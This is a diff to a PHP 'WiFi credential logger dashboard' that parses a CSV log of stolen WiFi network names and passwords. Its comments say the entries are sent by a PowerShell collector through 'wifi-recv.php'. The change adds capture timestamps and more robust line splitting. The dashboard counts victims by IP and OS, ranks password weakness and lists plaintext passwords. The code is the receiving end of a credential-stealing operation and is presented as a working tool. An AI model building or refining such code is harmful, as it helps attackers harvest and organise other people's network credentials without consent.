@@ -1,6 +1,6 @@
 <?php
 // WiFi credential logger dashboard
-// Single-file implementation (with safer parsing to avoid table glitches)
+// Single-file implementation (with safer parsing and real capture time)
 
 date_default_timezone_set('Asia/Kolkata');
 
@@ -52,10 +52,10 @@ $viewerIP = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
 $viewerUA = $_SERVER['HTTP_USER_AGENT'] ?? '';
 $viewerOS = detectOS($viewerUA);
 
-// Read the log file
-$lines = [];
+// Read the log file (each element may contain CSV text)
+$rawLines = [];
 if (file_exists($logFile)) {
-    $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    $rawLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
 }
 
 // Initialize counters and arrays
@@ -67,76 +67,82 @@ $weakPasswords = 0;
 $captureEntries = [];
 
 // Parse each line from the CSV log
-// Format: "profile_name","password","ip","os"
-foreach ($lines as $lineNum => $line) {
-    $line = trim($line);
-    if (empty($line)) continue;
+// CSV format from PowerShell: "Time","SSID","Pass","IP","OS"
+foreach ($rawLines as $rawLine) {
+    // In case wifi-recv.php appended blocks, split into single lines
+    $lines = preg_split('/\r\n|\r|\n/', $rawLine);
+    foreach ($lines as $lineNum => $line) {
+        $line = trim($line);
+        if ($line === '') continue;
 
-    // Skip header row if present
-    if (stripos($line, 'profile_name') !== false &&
-        stripos($line, 'password') !== false &&
-        stripos($line, 'ip') !== false &&
-        stripos($line, 'os') !== false) {
-        continue;
+        // Skip header row if present
+        if (stripos($line, 'time') !== false &&
+            stripos($line, 'ssid') !== false &&
+            stripos($line, 'pass') !== false &&
+            stripos($line, 'ip') !== false &&
+            stripos($line, 'os') !== false) {
+            continue;
+        }
+
+        $fields = str_getcsv($line);
+        if (count($fields) < 5) continue;
+
+        // Extract fields safely (Time, SSID, Pass, IP, OS)
+        $timeStr  = isset($fields[0]) ? trim($fields[0]) : '';
+        $ssid     = isset($fields[1]) ? trim($fields[1]) : '';
+        $pass     = isset($fields[2]) ? trim($fields[2]) : '';
+        $sourceIP = isset($fields[3]) ? trim($fields[3]) : '';
+        $sourceOS = isset($fields[4]) ? trim($fields[4]) : '';
+
+        // Hard filter: skip obvious header / garbage rows
+        $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password'];
+        if (
+            $ssid === '' ||
+            in_array($ssid, $badSsids, true) ||
+            $pass === '' ||
+            in_array($pass, ['Pass', 'password'], true)
+        ) {
+            continue;
+        }
+
+        // Use capture time from CSV; fallback to "unknown"
+        $timestamp = $timeStr !== '' ? $timeStr : 'unknown';
+
+        $totalCaptures++;
+
+        // Track unique SSIDs
+        if ($ssid !== '') {
+            $ssidCount[$ssid] = isset($ssidCount[$ssid]) ? $ssidCount[$ssid] + 1 : 1;
+        }
+
+        // Track source IPs
+        if ($sourceIP !== '') {
+            $ipCount[$sourceIP] = isset($ipCount[$sourceIP]) ? $ipCount[$sourceIP] + 1 : 1;
+        }
+
+        $passLength = strlen($pass);
+        $totalPasswordLength += $passLength;
+
+        // Check password strength (basic)
+        $allLetters   = ($pass !== '' && ctype_alpha($pass));
+        $allNumbers   = ($pass !== '' && ctype_digit($pass));
+        $weakPassword = ($passLength < 8 || $allLetters || $allNumbers);
+
+        if ($weakPassword) {
+            $weakPasswords++;
+        }
+
+        $captureEntries[] = [
+            'idx'      => count($captureEntries),
+            'time'     => $timestamp,
+            'ip'       => $sourceIP !== '' ? $sourceIP : 'offline',
+            'os'       => $sourceOS !== '' ? $sourceOS : 'unknown',
+            'ssid'     => $ssid,
+            'password' => $pass,
+            'len'      => $passLength,
+            'weak'     => $weakPassword,
+        ];
     }
-
-    $fields = str_getcsv($line);
-    if (count($fields) < 4) continue;
-
-    // Extract fields safely
-    $ssid     = isset($fields[0]) ? trim($fields[0]) : '';
-    $pass     = isset($fields[1]) ? trim($fields[1]) : '';
-    $sourceIP = isset($fields[2]) ? trim($fields[2]) : '';
-    $sourceOS = isset($fields[3]) ? trim($fields[3]) : '';
-
-    // Hard filter: skip obvious header / garbage rows
-    $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password'];
-    if (
-        $ssid === '' ||
-        in_array($ssid, $badSsids, true) ||
-        $pass === '' ||
-        in_array($pass, ['Pass', 'password'], true)
-    ) {
-        continue;
-    }
-
-    // Use current timestamp for display (log file itself doesn't store time)
-    $timestamp = date('d M Y, h:i:s a');
-
-    $totalCaptures++;
-
-    // Track unique SSIDs
-    if ($ssid !== '') {
-        $ssidCount[$ssid] = isset($ssidCount[$ssid]) ? $ssidCount[$ssid] + 1 : 1;
-    }
-
-    // Track source IPs
-    if ($sourceIP !== '') {
-        $ipCount[$sourceIP] = isset($ipCount[$sourceIP]) ? $ipCount[$sourceIP] + 1 : 1;
-    }
-
-    $passLength = strlen($pass);
-    $totalPasswordLength += $passLength;
-
-    // Check password strength (basic)
-    $allLetters   = ($pass !== '' && ctype_alpha($pass));
-    $allNumbers   = ($pass !== '' && ctype_digit($pass));
-    $weakPassword = ($passLength < 8 || $allLetters || $allNumbers);
-
-    if ($weakPassword) {
-        $weakPasswords++;
-    }
-
-    $captureEntries[] = [
-        'idx'      => $lineNum,
-        'time'     => $timestamp,
-        'ip'       => $sourceIP !== '' ? $sourceIP : 'offline',
-        'os'       => $sourceOS !== '' ? $sourceOS : 'unknown',
-        'ssid'     => $ssid,
-        'password' => $pass,
-        'len'      => $passLength,
-        'weak'     => $weakPassword,
-    ];
 }
 
 $uniqueSSIDs     = count($ssidCount);
